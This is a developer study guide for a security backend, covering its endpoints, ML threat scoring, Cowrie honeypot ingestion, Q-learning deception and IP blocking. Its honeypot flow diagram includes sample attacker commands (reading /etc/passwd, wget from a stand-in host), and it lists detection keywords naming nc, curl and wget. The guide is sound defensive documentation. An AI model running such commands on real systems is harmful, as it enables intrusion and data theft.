# SentinelAI Backend — Study Guide (Phases 2–6)

Generated 2026-10-21 from the working tree on branch `db-fixes` (uncommitted changes included).
Every claim cites a file. "NOT FOUND" means the thing does not exist in the code. Phase 1 (the
folder/boot/env/dependency map) was delivered in chat; one correction to it: there are **12**
Mongoose models, not 13.

> **Update 2026-10-21:** the seven High issues (H1–H7) in Phase 4 have since been fixed. See
> `docs/HIGH_PRIORITY_FIXES_REPORT.md`. The descriptions below show the code *before* those fixes.

What was actually executed while writing this:

| Check | Result |
|---|---|
| Backend Jest (`npx jest --runInBand --ci`) | **54 suites passed, 4 skipped; 948 tests passed, 13 skipped**, 0 failed (60.7 s) |
| AI engine pytest (`.venv` Python 3.11.9) | **335 passed**, 0 failed, 8 warnings (56 s) |
| AI engine started live on `127.0.0.1:8011` | Loaded `ai-engine/models/rf_classifier_cicids_v2.pkl` + `isolation_forest_cicids.pkl`; SHAP ready; `/ready` = ok |
| AI auth probes | no key → 401, wrong key → 403, NaN feature → 422 |
| Model introspection (joblib) | time-of-day features have variance 0 and importance 0 in every shipped model (see 3.5c) |
| `/deception/score` ×3 | always `centos_7 → centos_7`, recommendation never applied (see Flow 2) |
| Backend / MongoDB / Cowrie live | **Not started** — I did not run them against your real `sentinel-db`. Commands are in Phase 3. |

---

# PHASE 2 — HOW IT WORKS, END TO END

## 2.1 Authentication building blocks (needed to read the endpoint tables)

| Name in tables | What it is | Where |
|---|---|---|
| **P** (`protect`) | `Authorization: Bearer <access JWT>`; token verified **and** the server-side `AuthSession` re-read from Mongo on every request (`sessions.authorize`). Blocks users with `mustChangePassword` except lifecycle paths. | `backend/middleware/auth.js:28-57`, `services/authSessionService.js` |
| **R(a,b)** (`restrictTo`) | Role allow-list (`admin`, `analyst`, `viewer`); denial is audit-logged. | `middleware/auth.js:60-78` |
| **Perm(x)** (`requirePermission`) | Permission from the role matrix. | `middleware/auth.js:80-99`, `config/permissions.js` |
| **CSRF** (`protectMutation`) | Every POST/PUT/PATCH/DELETE under `/api/auth` needs an allowed `Origin`, the `sentinel_csrf_v2` cookie, and `X-CSRF-Token: <nonce>.<HMAC>` from `GET /api/auth/csrf`. | `middleware/authCookies.js:62-93` (`getCsrf` 62, `protectMutation` 75), `routes/auth.js:132-135` |
| **K-ingest** (`internalAuth`) | `X-API-Key` equal to `HONEYPOT_API_KEY` **or** `SENTINEL_KEY`. | `routes/honeypotIngest.js:9-14`, `utils/apiKeys.js` |
| **K-ai** (`aiEngineOnly`) | `X-API-Key` must be `SENTINEL_KEY`; the honeypot key gets 403. | `routes/aiEngine.js` (`aiEngineOnly`) |
| **K-py** (`verify_api_key`) | FastAPI: `X-API-Key` compared with `secrets.compare_digest` to `SENTINEL_KEY`. | `ai-engine/inference/main.py:75-79` |

Tokens: access token lifetime is 15 min (logged at `server.js:89-91`); refresh token lives in an
httpOnly `SameSite=strict` cookie scoped to `/api/auth` (`authCookies.js:20-28`). Public
registration is disabled: `POST /api/auth/register` always returns 403 (`controllers/authController.js:20-21`).

## 2.2 Every REST endpoint — Node backend (base `http://127.0.0.1:5000`)

Response envelope (`utils/apiResponse.js`): success → `{success:true, message, data, timestamp}`;
error → `{success:false, error, code, timestamp}`; paginated → `{success, data:[...], pagination}`.

### Built into `server.js`
| Method & route | Auth | Purpose / output | Line |
|---|---|---|---|
| GET `/` | none | Banner JSON | 109 |
| GET `/health` | none | `{status:'ok'}` 200 only if Mongo connected **and** AI `/ready` ok **and** revocation delivery available, else 503 | 118-133 |
| GET `/api/system/health` | P + Perm(system:telemetry_full) | Memory, DB, AI, honeypot node, socket client counts | 136-186 |
| GET `/api/ws/stats` | P + Perm(system:telemetry_full) | `socketManager.getStats()` | 187 |
| GET `/api/docs`, `/api/docs.json` | none (non-production only) | Swagger UI / spec | 192-210 |
| POST `/api/test/emit-socket` | **none** — only exists when `NODE_ENV=test` AND `ALLOW_TEST_ROUTES=true` | Emits arbitrary socket event | 226-238 |

### `/api/auth` — `routes/auth.js` → `controllers/authController.js`
| Method & route | Auth | Input → Output |
|---|---|---|
| GET `/csrf` | none (origin checked) | → `{csrfToken}` + csrf cookie |
| POST `/register` | CSRF | always 403 "Public registration is disabled" |
| POST `/provision` | CSRF + P + R(admin) + `validateRegister` | `{name,email,password,role,...}` → creates user |
| POST `/login` | CSRF + `validateLogin` + authLim (100/15 min) | `{email,password}` → `{token,user}` + refresh cookie |
| POST `/refresh-token` | CSRF + refresh cookie | → new `{token,user}` (rotation) |
| POST `/logout` | CSRF | revokes current session |
| POST `/logout-all` | CSRF + P | revokes all sessions of user |
| GET `/me` | P | current user |
| PUT `/update-password` | CSRF + P | `{currentPassword,newPassword}` |

### `/api/threats` — `routes/threats.js` (all behind P) → `controllers/threatController.js`
| Method & route | Extra auth | Purpose |
|---|---|---|
| GET `/analytics/summary` | — | dashboard aggregates |
| GET `/vector-trend` | — | attack-type trend |
| GET `/recent` | — | latest threats |
| GET `/settings` | Perm(settings:read) | `{autoBlockEnabled}` (creates the doc with `false` if missing) |
| POST `/settings` | Perm(settings:write) | `{autoBlockEnabled:true|false}` → `SystemSetting` upsert + audit, rolls back on audit failure |
| GET `/blocked-ips` | — | BlockedIP list |
| POST `/block-ip` | R(admin,analyst) | `{ip,reason}` → `containmentService.blockIPManual` (deny-list only) |
| POST `/unblock-ip` | R(admin,analyst) | `{ip}` → `unblockIPManual` |
| GET `/` | — | paginated, filtered threat list |
| POST `/` | R(admin,analyst) | manual threat creation |
| GET `/:id` | `validateObjectId` | one threat |
| PUT `/:id` | R(admin,analyst) | update |
| DELETE `/:id` | R(admin) | delete (cascade tested in `tests/threatDeletionCascade.test.js`) |
| POST `/:id/block` | R(admin,analyst) | `blockThreat` (deny-list only) |
| PATCH `/:id/triage` | Perm(threats:triage) | status/notes triage |

### `/api/containment` — `routes/containment.js` (P + R(admin,analyst)) → `containmentController.js` → `containmentService.js`
| Method & route | Purpose |
|---|---|
| GET `/status` | adapter backend type/name (`getContainmentStatus`, line 475) |
| GET `/actions` | list ContainmentAction |
| POST `/actions` | `{target, actionType, durationSeconds, isPermanent, reason, idempotencyKey}` → `requestContainment` → **policy → adapter.applyRule** |
| GET `/actions/:id` | one action |
| POST `/actions/:id/rollback` | `rollbackContainment` → `adapter.removeRule` |

### `/api/honeypot/ingest` — `routes/honeypotIngest.js` (K-ingest, machine-to-machine)
| Method & route | Input | Output / effect |
|---|---|---|
| GET `/check-block?ip=` | optional IP | `{blocked, ip}` or `{blockedIPs:[...]}` — polled by `cowrie/sentinel_blocker.py` |
| POST `/` | `{eventType ∈ SESSION_OPENED, COMMAND_INPUT, COMMAND_FAILED, FILE_DOWNLOAD, SESSION_CLOSED, CLIENT_KEX, sessionId, sourceIP, ...}` | dispatches to `honeypot/collectors/session_collector.js`; 400 unsupported type; 404 if session not found |
| POST `/match-session` | `{sourceIP, sourcePort, startTime}` | matches a session within ±5 s → `{matched, sessionId, aiClassification}` (used by sniffer) |
| POST `/command` | `{sessionId, sourceIP, command ≤2048}` | intent re-derived server-side; `{received, deceptionScore}` |
| POST `/download` | `{sessionId, sourceIP, url ≤2048, sha256}` | IOC + CRITICAL alert |
| POST `/close` | `{sessionId, sourceIP, durationSeconds, commands, credentials, hassh}` | runs closure analysis (AI + Q-learner + campaign) |

### `/api/honeypot` — `routes/honeypot.js` (P) → `honeypotController.js` / `honeypotService.js`
GET `/status`, GET `/analytics`, GET `/nodes`, GET `/sessions`, POST `/sessions` (R admin,analyst),
GET `/sessions/:id`, POST `/sessions/:id/commands` (R admin,analyst), PUT `/sessions/:id/close` (R admin,analyst).

### `/api/campaigns` — `routes/campaigns.js` (P)
GET `/` (list), GET `/:id`.

### `/api/alerts` — `routes/alerts.js` (P) → `alertController.js`
GET `/unread-count`, PUT `/mark-all-read`, GET `/`, POST `/` (R admin), PUT `/:id/read`, DELETE `/:id` (R admin).

### `/api/users` — `routes/users.js` (P + R(admin) for everything)
GET `/stats`, GET `/`, GET/PUT/DELETE `/:id`, POST `/:id/force-logout`.

### `/api/ai` — `routes/aiEngine.js`
| Method & route | Auth | Purpose |
|---|---|---|
| GET `/engine/health` | P | proxies FastAPI `/ready` + `/model/info` |
| GET `/engine/model-info` | P | proxies `/model/info` |
| GET `/engine/stats` | P | proxies `/model/stats` |
| POST `/analyze` | P + R(admin,analyst) | **body = one flow record** → `aiEngineService.runFullPipeline` (Flow 1) |
| GET `/predictions` | P | paginated AIPrediction, redacted per role |
| POST `/predictions` | K-ai | callback from FastAPI `_notify`; only whitelisted fields (`PREDICTION_CALLBACK_FIELDS`) → `storePrediction` |
| GET `/stats` | P | Mongo-side model stats (`aiService.getModelStats`) |
| PUT `/predictions/:id/verify` | P + R(admin,analyst) | analyst sets `actualClass` → queues a TrainingSample (QUARANTINED) |

### `/api/training-samples` — `routes/trainingSamples.js`
GET `/` and GET `/:id` (R admin,analyst); POST `/ingest/:id` (R admin,analyst); POST `/:id/validate` (R admin);
POST `/:id/reject` (R admin,analyst); POST `/:id/promote` (R admin); POST `/:id/supersede` (R admin).
Statuses: `QUARANTINED, VALIDATED, ELIGIBLE_FOR_TRAINING, REJECTED, SUPERSEDED` (`models/TrainingSample.js:6`).

### `/api/system/outbox` — `routes/systemOutbox.js` (P)
GET `/status` (admin,analyst), GET `/failed` (admin), POST `/redrive` (admin). Backed by the
**in-memory** `InMemoryOutboxStore` in `utils/securityEventBus.js:101`; the live socket path does not use this bus (only this router requires it).

### `/api/audit` — `routes/audit.js` (P + Perm(audit:read))
GET `/` — audit log query.

## 2.3 FastAPI endpoints (base `http://127.0.0.1:8000`, file `ai-engine/inference/main.py`)

| Method & route | Auth | Input | Output / side effect | Line |
|---|---|---|---|---|
| GET `/health` | none | — | `{status:'ok'}` always (liveness) | 167 |
| GET `/ready` | none | — | 200 only if models loaded, else 503 (readiness) | 161 |
| GET `/model/info` | K-py | — | versions, `rfMetrics`, `featureCount: 53`, thresholds `{block:0.92, monitor:0.7, anomaly:-0.55}` | 171 |
| GET `/model/stats` | K-py | — | in-memory counters since process start | 176 |
| POST `/predict` | K-py | `Record` (flow fields, all defaulted) `?explain=` | result; **background `_notify` → POST backend `/api/ai/predictions` if score ≥ `SCORE_THRESHOLD`** | 181 |
| POST `/predict/internal` | K-py | `Record` | result incl. `featureVector`; **no callback** (backend persists itself) | 189 |
| POST `/predict/honeypot/internal` | K-py | `SessionData` | rule-synthesised flow → RF/IF, no callback | 198 |
| POST `/predict/eval` | K-py | `Record` | pure evaluation — no stats, no callback, no DB | 205 |
| POST `/predict/batch` | K-py | `List[Record]` ≤500 | results; callbacks for threats | 220 |
| POST `/predict/honeypot` | K-py | `SessionData` | result + callback | 230 |
| POST `/deception/score` | K-py | `SessionData` | **Q-learning update** + recommendation | 237 |
| POST `/predict/auth/shadow` | K-py | `AuthTelemetryRecord` | shadow E2 detector (disabled unless `ENABLE_SHADOW_E2`) | 252 |

## 2.4 Every Socket.IO event

Connection gate (`server.js:25-35`): origin must be in `allowedOrigins()` (= `CLIENT_URL` + its
localhost/127.0.0.1 twin in dev); HTTPS required in production. Handshake auth
(`websocket/auth.js:4-23`): `socket.handshake.auth.token` or `Authorization: Bearer`; rejected if
invalid or `mustChangePassword`. After connect, the socket joins `auth-session:<sid>` and
`auth-user:<id>` (used for revocation), is disconnected at token expiry, re-checked every 15 s, and
**every incoming packet re-authorizes against Mongo** (`auth.js:32-41`).

**Client → server** (`websocket/socketManager.js`)
| Event | Payload | Effect | Line |
|---|---|---|---|
| `join_room` | `{role, userId, room}` (role is **ignored**; server-verified role used) | joins `<role>`, `threat_subscribers_<role>`, `all`, `threat_subscribers`; admin/analyst also `threat_subscribers_privileged` (+ `admin`/`analyst` custom room); replies `connected` | 24-53 |
| `subscribe_threats` | — | joins threat rooms; replies `subscribed` | 55-62 |
| `request_stats` | — | 3 `countDocuments` → replies `stats_snapshot` | 64-83 |
| `ping_sentinel` | — | replies `pong_sentinel` | 85 |

The React client emits `join_room` and `subscribe_threats` on connect (`frontend/src/context/SocketContext.jsx:29-30`).
**A client that never emits `join_room` receives no broadcasts** — every emit targets a role room.

**Server → client**
| Event | Rooms | Emitted by |
|---|---|---|
| `new_threat` | raw → admin, analyst, threat_subscribers_privileged; redacted → viewer, threat_subscribers_viewer | `emitNewThreat` (99-144) |
| `live_feed_event` | admin+analyst / viewer (redacted) | `emitNewThreat`, `emitIPBlocked`, `emitIPUnblocked`, `emitHoneypotEvent` |
| `critical_alert` | admin only, when severity CRITICAL | `emitNewThreat` (142) |
| `threat_updated` | privileged / viewer | `emitThreatUpdated` (146) |
| `threat_intel_updated` | admin+analyst / viewer | `emitThreatIntelUpdated` (162) |
| `ip_blocked`, `ip_unblocked` | admin+analyst / viewer (masked IP) | `emitIPBlocked` (178), `emitIPUnblocked` (200) |
| `new_alert` | per alert `targetRoles`; viewer redacted | `emitNewAlert` (222) |
| `ai_prediction` | admin+analyst raw / viewer redacted | `emitAIPrediction` (247) |
| `honeypot_session_opened`, `honeypot_command`, `malware_download`, `honeypot_session_closed` | admin+analyst raw / viewer redacted | `emitHoneypotEvent` (275) via the collector |
| `system_health` | every 15 s, only if ≥1 client: full to admin+analyst, minimal to viewer | `startHealthBroadcast` (311-348) |
| `connected`, `subscribed`, `stats_snapshot`, `pong_sentinel` | requesting socket | replies above |

## 2.5 Flow 1 — traffic → features → AI → decision → MongoDB → dashboard

**Important truth first:** there is **no automatic network-traffic path into the dashboard**.
- `honeypot/sniffer/sniffer.py` captures packets with Scapy, converts them with cicflowmeter, asks
  `/honeypot/ingest/match-session` for a label, and **appends labelled flows to `flows.csv`** — a
  dataset builder, not a detector (`sniffer.py` lines ~103-187).
- `ai-engine/demo/replay_cicids.py` posts CICIDS rows to **`/predict/eval`** (line 299), which by
  design stores nothing and pushes nothing.

A flow reaches MongoDB and the dashboard only through:
- **(A)** an analyst calling `POST /api/ai/analyze` with a flow record, or
- **(B)** any holder of `SENTINEL_KEY` calling FastAPI `POST /predict`, which calls back the backend.

Path (A), step by step:

```
Analyst/UI          Node /api/ai          aiEngineService        FastAPI              predictor.py            aiService.storePrediction       Mongo                 socketManager
   | POST /analyze      |                       |                     |                     |                          |                          |                        |
   |------------------->| protect, R(admin,     |                     |                     |                          |                          |                        |
   |                    | analyst)              |                     |                     |                          |                          |                        |
   |                    |-- runFullPipeline --->|                     |                     |                          |                          |                        |
   |                    |                       |-- POST /predict/internal (X-API-Key, 10s timeout) -->|                     |                          |                        |
   |                    |                       |                     | Record validation   |                          |                          |                        |
   |                    |                       |                     | (finite numbers)    |                          |                          |                        |
   |                    |                       |                     |-- predict() ------->| extract_features_from_   |                          |                        |
   |                    |                       |                     |                     | record → 53-vector       |                          |                        |
   |                    |                       |                     |                     | RF predict+proba         |                          |                        |
   |                    |                       |                     |                     | IF score_samples         |                          |                        |
   |                    |                       |                     |                     | score=0.7*rf+0.3*if_sig  |                          |                        |
   |                    |                       |                     |<-- result ----------|                          |                          |                        |
   |                    |                       |<-- {result, featureVector} --------------|                          |                          |                        |
   |                    |                       | validate score ∈[0,1]; else DEGRADED      |                          |                          |                        |
   |                    |                       | getBlockThreshold() (cached 60 s, from /model/info)                  |                          |                        |
   |                    |                       | action = BLOCK/MONITOR/ALLOW              |                          |                          |                        |
   |                    |                       |----------------------------- storePrediction ------------------------>| AIPrediction.create ---->|                        |
   |                    |                       |                     |                     |                          | if score≥0.7 & !BENIGN   |                        |
   |                    |                       |                     |                     |                          | or degraded:             |                        |
   |                    |                       |                     |                     |                          |  read SystemSetting      |                        |
   |                    |                       |                     |                     |                          |  autoBlockEnabled        |                        |
   |                    |                       |                     |                     |                          |  ThreatLog.create ------>|                        |
   |                    |                       |                     |                     |                          |  [shouldBlock] executeAutoBlock (Flow 3)          |
   |                    |                       |                     |                     |                          |---------------------- emitNewThreat ------------->| new_threat, live_feed_event
   |                    |                       |                     |                     |                          |  alert (HIGH/CRIT) ----->|---- emitNewAlert ----->| new_alert
   |                    |                       |                     |                     |                          |  setImmediate threatIntel (AbuseIPDB)             |
   |                    |                       |                     |                     |                          |---------------------- emitAIPrediction ---------->| ai_prediction
   |<-- {result, _id, action} ------------------|                     |                     |                          |                          |                        |
```

Details to be able to defend:
1. **Feature extraction** — `ai-engine/utils/features.py::extract_features_from_record` (line 237)
   builds the 53-feature vector in `FEATURE_NAMES` order (lines 9-28). Missing fields fall back to
   the pydantic defaults in `main.py` `Record` (lines 81-118), so a nearly empty body still
   produces a prediction; `defaultedFeatures` in the response lists which ones were filled in.
2. **Scoring** — `predictor.py::predict` (line ~300):
   - `rf_s = max_p` if the class isn't BENIGN, else `1 − max_p`.
   - `if_sig` comes from `calculate_if_anomaly_signal`: 0 for inliers, rising linearly to 1 below
     the IF offset.
   - `threatScore = round(0.7·rf_s + 0.3·if_sig, 4)`.
   - If the RF says BENIGN but the IF says anomaly (`if_score < −0.55`), the class becomes
     `Unknown` with score ≥ 0.55.
   - Engine action: `BLOCK` if ≥ 0.92, `MONITOR` if ≥ 0.70, otherwise `ALLOW` (`predictor.py:86-90`).
3. **Decision in Node** — `aiEngineService.js:117-135`:
   - Degraded or unavailable inference is always `MONITOR`.
   - An engine recommendation of `MONITOR`/`BLOCK` is honoured.
   - Otherwise the backend applies its own threshold.
4. **What gets stored** — `aiService.storePrediction` (`aiService.js:38-169`):
   - **Always** an `AIPrediction`.
   - A `ThreatLog` only when score ≥ 0.7 and the class isn't BENIGN, or when inference was degraded.
   - Severity: CRITICAL ≥ 0.9, HIGH ≥ 0.75, else MEDIUM.
5. **The block decision** — `shouldBlock = !degraded && score ≥ blockThreshold(0.92) && SystemSetting.autoBlockEnabled === true`.
   `autoBlockEnabled` defaults to **false** (`aiService.js:69-72`).
6. **Path (B)** — FastAPI `/predict` runs the same predictor, then `_notify` (`main.py:148-155`)
   POSTs to `{SENTINEL_API}/ai/predictions` with `SENTINEL_KEY` if the score is ≥ `SCORE_THRESHOLD`
   (0.7). The backend whitelists the fields and calls the same `storePrediction`. Lower scores are
   **not** stored at all on this path.

## 2.6 Flow 2 — attacker hits Cowrie → event → Q-learning → response

```
Attacker        Cowrie (tcp:2222)     cowrie.json      log_parser.py --live        Node /api/honeypot/ingest      session_collector.js            honeypotService.closeSession          FastAPI                       Mongo / Socket.IO
  | ssh root@host -p 2222 |                 |                    |                            |                             |                                      |                              |
  |---------------------->| writes events --->| tail (0.5 s poll)  |                            |                             |                                      |                              |
  | login (userdb.txt)    | session.connect  |-- on_connect: remember session in memory (no POST yet)   |                             |                                      |                              |
  |                       | login.success    |-- ensure_session_opened → POST / {SESSION_OPENED} ------>| onSessionOpened                                                   | HoneypotSession(active)
  |                       |                  |                    |                            |                             | + ThreatLog "SSH Brute Force" aiScore 0.75 (HEURISTIC, no ML)    | ThreatLog, new_threat,
  |                       |                  |                    |                            |                             |                                      |                              | honeypot_session_opened
  | cat /etc/passwd       | command.input    |-- POST /command {sessionId, sourceIP, command} --------->| onCommandReceived: intent regex,                                  | commands[] pushed
  |                       |                  |                    |                            |                             | deceptionScore = min(100, 3n+10·files+8·urls)                      | honeypot_command
  |                       |                  |                    |                            |                             | Alert if MALWARE/REVERSE_SHELL/PERSISTENCE                         |
  | wget http://x/a       | file_download    |-- POST /download -------------------------------------->| onFileDownload: IOC, +15, CRITICAL alert                          | malware_download
  | exit                  | session.closed   |-- POST /close {duration, commands, credentials, hassh} ->| onSessionClosed → closeSession(id) ---->| claim closureAnalysisState=processing (atomic)
  |                       |                  |                    |                            |                             |                                      |-- POST /predict/honeypot/internal -->| rule profile → synthetic 53-vector → RF/IF; +0.02/command
  |                       |                  |                    |                            |                             |                                      |<-- predictedClass, threatScore       |
  |                       |                  |                    |                            |                             |                                      | storePrediction(honeypot_log) → maybe ThreatLog/auto-block      |
  |                       |                  |                    |                            |                             |                                      | update linked ThreatLog severity / status                       |
  |                       |                  |                    |                            |                             |                                      |-- POST /deception/score {deceptionProfile: DECEPTION_ACTIVE_PROFILE||'centos_7'} -->|
  |                       |                  |                    |                            |                             |                                      |   calc_reward → Q-update → choose next profile                   |
  |                       |                  |                    |                            |                             |                                      |<-- qDeceptionScore=min(5·reward,100), recommendedProfile         |
  |                       |                  |                    |                            |                             |                                      | session.save; campaignService.clusterSession                      | honeypot_session_closed
  |<- (nothing changes for the attacker: recommendation is never applied)            |                             |                                      |                              |
  | next connection       | sentinel_blocker.py polls GET /check-block → drops IPs in BlockedIP                         |                                      |                              |
```

What to know precisely:
- **Ingest path.** The live path is `honeypot/parsers/log_parser.py --live`.
  - The Cowrie output plugin `cowrie/sentinel_output.py` exists, but `honeypot/cowrie/cowrie.cfg`
    has **no `[output_sentinel]` section**, so it is not enabled. Only `[output_sentinel_blocker]` is.
  - The parser holds open sessions in a Python dict (`_sessions`, line 28). It only POSTs once SSH
    activity happens: login, command, download or kex (`ensure_session_opened`, lines 54-72).
- **Two different "deception scores".**
  - `HoneypotSession.deceptionScore` is a heuristic: `min(100, 3·commands + 10·sensitiveFiles + 8·urls)`,
    plus 15 per download (`session_collector.js` lines 52, 68).
  - `HoneypotSession.qDeceptionScore` comes from the Q-learner: `min(5·reward, 100)` (`deception_scorer.py:223`).
- **AI on a honeypot session is not real flow ML.** Cowrie gives no packet data.
  `features.py::extract_features_from_honeypot` (lines 318-420) picks a class by keyword rules
  (no login → "SSH Brute Force"; no commands → "Port Scan"; scp/tar/nc or >120 s → "Data Exfiltration";
  ssh/ping/nmap → "Lateral Movement"; wget/curl/chmod/bash → "RCE Attempt"; otherwise BENIGN).
  It then fabricates a flow vector from per-class constants and runs RF/IF on that. The result is
  labelled `classificationMethod: "rule_profile_synthetic_flow"`.
  Live probe: a logged-in session running only `cat /etc/passwd` came back **BENIGN, score 0.0813**.
- **The Q-learning update** (`ai-engine/rl_engine/deception_scorer.py`):
  - Reward (`calc_reward`, 79-88): `2·ln(1+dur/60)`, + 0.3 per command, + intent bonuses
    (MALWARE_DOWNLOAD 3.0, REVERSE_SHELL 2.5, PERSISTENCE 2.0, CREDENTIAL_HARVEST 1.5,
    PRIVILEGE_ESCALATION 1.5), + 0.5 per IOC, + 2 if login succeeded; capped at 20.
  - Update (186-191): `Q[s][a] ← Q[s][a] + α(r + γ·max Q[s'] − Q[s][a])`, with α=0.1, γ=0.9.
  - Credit assignment (`SessionScorer.process_session`, 211-223): action = the profile that was
    active (`deceptionProfile`), state = the previous profile, next state = the active one.
  - Exploration: ε-greedy with ε = 0.2/(1+0.01·episodes).
  - Six profiles: ubuntu_22, debian_11, centos_7, windows_srv, aws_ec2, raspberry_pi (lines 67-74).
- **Why learning is degenerate in practice.** The backend always sends
  `deceptionProfile = DECEPTION_ACTIVE_PROFILE || 'centos_7'` (`honeypotService.js:130`), and the
  recommendation is never applied (`recommendationApplied: False`; `switch_profile.py` never
  restarts Cowrie). So every episode updates the single cell `Q[centos_7][centos_7]`.
  Live probe: three calls gave `centos_7 -> centos_7` each time, with `next ubuntu_22` and
  `applied False`. In the viva, call it **online reward estimation for the served persona plus a
  recommendation**, not adaptive deception.
- **Persistence.**
  - The learner saves every 10 episodes (line 191) and on FastAPI shutdown (`main.py:44-50`),
    atomically: temp file → fsync → `os.replace` (156-179).
  - Without `SENTINEL_ALLOW_REPO_RUNTIME_WRITE=1` or `Q_TABLE_PATH`, the file is
    `%TEMP%\sentinelai_isolated_runtime_<pid>\q_table.json`, seeded from `models/q_table.json`
    (`deception.py:86-95`, `deception_scorer.py:46-65`). A new PID means a new folder, so
    **learning is lost on every restart**. There are 11 such folders in your `%TEMP%` right now.
  - The seed `models/q_table.json` says 12,087 episodes with 16/36 non-zero cells. No code or doc
    in the repo produces it, so its provenance is **NOT FOUND**; treat it as pre-seeded demo state.
  - `ai-engine/runtime/q_table.json` shows 99 episodes with all-zero Q values.
- **The "response" to the attacker.** The only thing that affects the attacker is the deny-list:
  `BlockedIP` is polled by `cowrie/sentinel_blocker.py` via `GET /check-block`, which then drops
  connections from those IPs. Nothing reconfigures the persona.
- **Campaigns.** `campaignService.clusterSession` groups sessions that share a `hassh` or have
  similar command sets (threshold 0.65, 7-day window).

## 2.7 Flow 3 — threat flagged → blocking decision (mock vs real)

There are **two separate blocking mechanisms**. Mixing them up is the most common way to overclaim.

**(1) Deny-list blocking (`BlockedIP` collection)** — used by auto-block, "Block" on a threat and "Block IP"
```
storePrediction / closeSession
   └─ shouldBlock = score ≥ 0.92 AND SystemSetting.autoBlockEnabled === true AND not degraded
        └─ containmentService.executeAutoBlock (containmentService.js:797-878)
              ├─ checkTargetSafety(ip)  (containmentPolicyService.js:340) → refuses loopback, broadcast,
              │     multicast, link-local, /0, IPv4 < /24, IPv6 < /64, core ports, CONTAINMENT_PROTECTED_TARGETS
              │     → on refusal: revert ThreatLog status, note [AUTO_BLOCK_REFUSED]
              ├─ BlockedIP.findOneAndUpdate(upsert)  → ThreatLog.containmentId
              │     → on failure: compensating rollback of ThreatLog (or isInconsistent error)
              └─ emit ip_blocked + alert "Enforced by the honeypot blocker only; no host firewall rule was applied."
```
**No firewall adapter is called on this path.** The only enforcement is Cowrie's blocker plugin,
which drops connections to the honeypot. Manual `POST /api/threats/:id/block` (`blockThreat`,
line 501) and `POST /api/threats/block-ip` (`blockIPManual`, line 612) also only write `BlockedIP`.

**(2) Containment actions (`ContainmentAction` collection + adapter)** — only via `POST /api/containment/actions`
```
requestContainment (containmentService.js:44)
   1 idempotencyKey dedupe
   2 evaluatePolicy (pure checks: target, CIDR width, protected ranges, requester role, duration)
   3 existing ACTIVE action on same normalizedTarget? → return it
   4 adapter = getContainmentAdapter()  (adapterFactory.js:18-45)
         NODE_ENV=test or CONTAINMENT_DRY_RUN=true        → MockContainmentAdapter (forced)
         CONTAINMENT_BACKEND=windows-firewall
            AND ENABLE_REAL_WINDOWS_FIREWALL_ENFORCEMENT=true → WindowsFirewallAdapter (REAL)
         anything else (default 'mock')                   → MockContainmentAdapter
   5 adapter.applyRule → ContainmentAction ACTIVE / FAILED, audit
rollbackContainment → adapter.removeRule
containmentReconciliationService (started at boot, server.js:248-253) → removes expired rules via adapter
```
`WindowsFirewallAdapter.applyRule` (`WindowsFirewallAdapter.js:76-117`):
- It runs `netsh advfirewall firewall add rule name="SentinelAI-Rule-<id>" dir=in action=block remoteip="<ip>"`
  through `child_process.exec`, which goes through a shell, with a 10 s timeout.
- The inputs are checked against allow-lists first: the target must match `[0-9a-fA-F.:/]`, and
  rule names must be `SentinelAI-Rule-[A-Za-z0-9_-]`.
- `_assertEnabled` re-checks the gate on every call.
- It blocks **inbound only**, and Windows only lets `netsh` add rules from an elevated
  (Administrator) process.

**What `autoBlock` controls:** only whether the AI path writes to the `BlockedIP` deny-list. It never
causes a firewall rule. The real firewall needs three things together:
- a person calling `/api/containment/actions` with
- `CONTAINMENT_BACKEND=windows-firewall` and
- `ENABLE_REAL_WINDOWS_FIREWALL_ENFORCEMENT=true` (and no `CONTAINMENT_DRY_RUN`, not in test).

The gate document's `AUTONOMOUS_CONTAINMENT=false` (`ai-engine/experiments/gate1_complete_remediation/gate1_final_decision.md`)
is **NOT FOUND** as a runtime variable. Only a test asserts it is unset
(`backend/tests/integrated_backend_safety_regression.test.js:129`). The real switch is
`SystemSetting.autoBlockEnabled`.

## 2.8 How Node talks to FastAPI

| Aspect | Fact | Where |
|---|---|---|
| Transport | HTTP/JSON via one axios instance | `backend/services/aiEngineService.js:8-14` |
| URL | `AI_ENGINE_URL` (default `http://localhost:8000`) | line 9 |
| Auth | `X-API-Key: SENTINEL_KEY` on every call; module throws at load if key missing | lines 3-13 |
| Timeouts | 10 s default; `/ready` and `/model/info` health probes 1.5 s | lines 10, 17-19 |
| Retries | **NOT FOUND** — no retry/backoff anywhere | — |
| Circuit breaker | **NOT FOUND** | — |
| FastAPI down on `/analyze` | `predictRecord` returns null → result `UNINSPECTED_TRAFFIC`, score 0.5, `MONITOR`, status `UNAVAILABLE` → **still stored**, creates a `DEGRADED` ThreatLog + MEDIUM system alert per request | `aiEngineService.js:61-77`, `aiService.js:59-134` |
| FastAPI down on honeypot close | `predictHoneypotSession` / `getDeceptionScore` return null → session saved without AI fields | `aiEngineService.js:193-208`, `honeypotService.js:139-140, 297-304` |
| Block threshold | fetched from `/model/info`, cached 60 s, fallback 0.92 | `aiEngineService.js:210-229` |
| `/health` | 503 while FastAPI is not ready | `server.js:118-133` |
| Reverse direction | FastAPI → Node `POST /api/ai/predictions` using `httpx` 5 s timeout, **no retry**, failure only logged | `main.py:148-155` |

## 2.9 MongoDB collections, indexes, readers and writers

| Collection (model file) | Key fields | Indexes (schema) | Written by | Read by |
|---|---|---|---|---|
| `threatlogs` (`ThreatLog.js`) | severity, sourceIP, attackType (enum incl. `Unknown`, `UNINSPECTED_TRAFFIC`), aiScore, status (enum 9), preBlockStatus, containmentId→BlockedIP, predictionId, eventTime, autonomousAction, threatIntel | createdAt↓; {severity,status}; {sourceIP,createdAt↓}; threatIntel.status; status; containmentId (+2 inline) | aiService.storePrediction, session_collector.onSessionOpened, honeypotService, threatController, containmentService, threatIntelService, retentionService | threatController, socketManager (stats/health), campaign, retention |
| `aipredictions` (`AIPrediction.js`) | inputSource, predictedClass, classProbabilities, threatScore, modelVersion, isAnomaly, anomalyScore, rawFeatures (Mixed), featureVector [53] (select:false), verified/actualClass/verificationHistory, generatedThreat | createdAt↓, threatScore↓, sourceIP | aiService.storePrediction/verifyPrediction | routes/aiEngine, aiService.getModelStats, trainingSampleService |
| `alerts` (`Alert.js`) | title, severity, type, isRead, targetRoles, sourceRef, **expiresAt (default +7 days)** | createdAt↓; {severity,isRead}; {targetRoles,isRead,createdAt↓}; sourceRef.refId; **TTL on expiresAt** | alertService, collector, containment | alertController |
